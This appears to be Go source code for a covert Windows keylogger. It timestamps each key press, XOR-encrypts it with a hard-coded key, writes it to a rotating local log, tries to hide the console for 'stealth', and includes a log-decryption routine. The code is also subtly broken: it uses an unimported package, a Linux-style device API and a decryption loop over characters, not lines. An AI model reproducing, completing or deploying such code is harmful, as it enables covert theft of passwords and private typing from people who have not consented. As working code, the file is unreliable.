package main

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"runtime"
	"time"
)

// XOR encryption key
var xorKey = []byte("secretkey")

// Log file path
const logFilePath = "encrypted_logs.txt"

// Initialize: Clear old logs on each run (Optional)
func init() {
	err := os.Remove(logFilePath)
	if err != nil && !os.IsNotExist(err) {
		log.Fatalf("Error clearing old logs: %v", err)
	}
}

// XOR encryption and decryption function
func xorEncryptDecrypt(input []byte) []byte {
	keyLen := len(xorKey)
	for i := range input {
		input[i] ^= xorKey[i%keyLen]
	}
	return input
}

// Write encrypted keystrokes to the log file
func writeEncryptedLog(logEntry string) {
	rotateLog() // Ensure log rotation is checked

	encryptedData := xorEncryptDecrypt([]byte(logEntry))
	hexData := hex.EncodeToString(encryptedData)

	logFile, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Error opening log file: %v", err)
	}
	defer logFile.Close()

	logFile.WriteString(hexData + "\n")
}

// Rotate the log file if it exceeds size or based on time
func rotateLog() {
	info, err := os.Stat(logFilePath)
	if err == nil && info.Size() > 5*1024*1024 { // If size exceeds 5MB
		backupPath := fmt.Sprintf("backup_%d.txt", time.Now().Unix())
		os.Rename(logFilePath, backupPath)
	}
}

// Keylogger logic to capture keystrokes
func startKeylogger() {
	if runtime.GOOS != "windows" {
		log.Fatal("This keylogger is designed for Windows.")
	}

	keyboard := keylogger.FindKeyboardDevice()
	if keyboard == "" {
		log.Fatal("No keyboard device found.")
	}

	k, err := keylogger.New(keyboard)
	if err != nil {
		log.Fatalf("Error opening keyboard device: %v", err)
	}
	defer k.Close()

	events := k.Read()

	for e := range events {
		if e.Type == keylogger.EvKey && e.KeyPress() {
			logEntry := fmt.Sprintf("[%s] Key: %s", time.Now().Format(time.RFC3339), e.KeyString())
			writeEncryptedLog(logEntry)
		}
	}
}

// Hide the console window on Windows for stealth
func hideConsoleWindow() {
	cmd := exec.Command("cmd", "/c", "powershell -WindowStyle Hidden -Command {}")
	cmd.Start()
}

// Decrypt the logs (Optional: Use for reading encrypted logs)
func decryptLogs() {
	data, err := ioutil.ReadFile(logFilePath)
	if err != nil {
		log.Fatalf("Error reading log file: %v", err)
	}

	lines := string(data)
	for _, line := range lines {
		encryptedData, _ := hex.DecodeString(line)
		decrypted := xorEncryptDecrypt(encryptedData)
		fmt.Println(string(decrypted))
	}
}

func main() {
	hideConsoleWindow() // Stealth mode

	fmt.Println("Launching keylogger...")
	startKeylogger() // Start capturing keystrokes
}
